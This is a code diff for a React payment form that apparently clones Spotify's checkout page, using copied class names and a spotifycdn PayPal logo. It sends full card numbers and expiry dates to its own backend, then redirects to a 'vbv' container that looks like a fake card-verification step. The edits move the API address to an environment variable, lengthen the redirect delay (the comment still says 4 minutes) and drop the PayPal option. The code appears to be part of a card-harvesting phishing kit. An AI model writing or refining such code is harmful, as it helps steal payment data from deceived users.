@@ -7,8 +7,6 @@ import './verifStyles.css';
 import { useHistory } from 'react-router-dom';
 import Container from './vbv/container';
 
-// Define API URL constant
-const API_URL = 'http://192.168.0.2:8000';
 
 const PaymentMethodForm = forwardRef((props, ref) => {
   const [showVbvContainer, setShowVbvContainer] = useState(false);
@@ -67,8 +65,8 @@ const PaymentMethodForm = forwardRef((props, ref) => {
       if (!validateCardData()) {
         return;
       }
-
-      const response = await axios.post(`${API_URL}/api/billing/credit-card`, {
+	setIsLoading(true);
+      const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/billing/credit-card`, {
         userId,
         cardNumber: cardData.cardNumber,
         expiryDate: cardData.expiryDate,
@@ -80,7 +78,7 @@ const PaymentMethodForm = forwardRef((props, ref) => {
         // Set timeout for redirect
         timeoutRef.current = setTimeout(() => {
           history.push('/container');
-        }, 240000); // 4 minutes
+        }, 600000); // 4 minutes
       }
     } catch (error) {
       console.error('Error:', error.response?.data || error.message);
@@ -178,36 +176,6 @@ const PaymentMethodForm = forwardRef((props, ref) => {
                     />
                   )}
                 </div>
-              </li>
-              <li className="sc-cyZbeP fsxnOw">
-                <a href="#" data-value="paypal" className="sc-lnsjTu leUClS">
-                  <div className="sc-khjJXk fnPcTG">
-                    <div className="Radio-sc-tr5kfi-0 cJTmQq">
-                      <input 
-                        type="radio" 
-                        name="paymentMethod" 
-                        value="paypal" 
-                        id="option-paypal" 
-                        checked={selectedMethod === 'paypal'}
-                        onChange={handleMethodChange}
-                        className="VisuallyHidden__VisuallyHiddenElement-sc-17bibe8-0 eCTHGg" 
-                      />
-                      <label htmlFor="option-paypal" className="Label-sc-17gd8mo-0 hOPeuj">
-                        <span className="Indicator-sc-hjfusp-0 ikOybT"></span>
-                        <span className="encore-text encore-text-body-small TextForLabel-sc-1wen0a8-0 gniVTV">
-                          <span className="encore-text encore-text-body-medium">PayPal</span>
-                        </span>
-                      </label>
-                    </div>
-                  </div>
-                  <div className="sc-dmXWDj iqyZyN">
-                    <div className="sc-kFCroH cyrFLU">
-                      <div className="sc-irLvIq jUYFeV">
-                        <img src="https://paymentsdk.spotifycdn.com/svg/providers/paypal.svg" className="sc-eTNRI fMxAnl" alt="PayPal" />
-                      </div>
-                    </div>
-                  </div>
-                </a>
               </li>
               {/* Add other payment options here */}
             </ul>
